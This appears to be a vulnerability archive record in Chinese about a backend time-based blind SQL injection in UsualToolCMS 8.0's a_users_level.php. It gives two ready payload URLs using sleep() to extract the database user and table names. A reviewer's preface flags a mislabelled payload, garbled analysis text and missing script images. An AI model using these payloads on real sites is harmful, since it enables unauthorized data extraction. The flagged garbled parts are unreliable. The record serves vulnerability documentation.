---
source: "hatch 补库批 20260928"
product: "UsualToolCMS8.0Release a_users_level"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "UsualToolcms 8.0 a_users_level.php 后台盲注"
prerequisites: "来源所述条件，未列明部分仍待核：后台用户级别管理、id数值未过滤，MySQLsleep"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-3298be47bba6597cd62ecdc0"
entity_id: "ve-3298be47bba6597cd62ecdc0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台用户级别管理、id数值未过滤，MySQLsleep

- **结论使用边界（1）**：当前数据库示例实际user()返回用户而非database()，命名错。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：原理文字postt/比没过滤句子损坏，首图指a_bookx；脚本仅图片后image占位。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（3）**：GET与POST过滤区别有价值，应补源码和请求认证。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# UsualToolcms 8.0 后台盲注

一、漏洞简介
------------

二、漏洞影响
------------

UsualToolCMS-8.0-Release

三、复现过程
------------

### 漏洞分析

./cmsadmin/a\_users\_level.php第19行和第26行，id参数可控

![](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId25.png)

从get处获取id参数，id存在无任何过滤，当postt
id时，通过sqlcheck函数进行过滤，来到文件./class/UsualToolCMS\_INC.php第33行，将(\',\\,\",null)转义，34行调用sqlchecks函数，比没过滤sql，然而a\_users\_level.php第19行id不是字符

![](./.resource/UsualToolcms8.0a_users_level.php后台盲注/media/rId26.png)

### 复现

可以利用时间盲注来进行sql注入攻击，payload如下：

    a.当前数据库：http://0-sec.org:8080/UsualToolCMS/cmsadmin/a_users_level.php?x=m&id=2 and if(ascii(substr(user(),1,1))=114,sleep(6),1)
    b.表：http://0-sec.org:8080/UsualToolCMS/cmsadmin/a_users_level.php?x=m&id=2 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>30,sleep(6),1)

![](./.resource/UsualToolcms8.0a_users_level.php后台盲注/media/rId28.png)

时间盲注验证脚本

![](./.resource/UsualToolcms8.0a_users_level.php后台盲注/media/rId29.png)

image
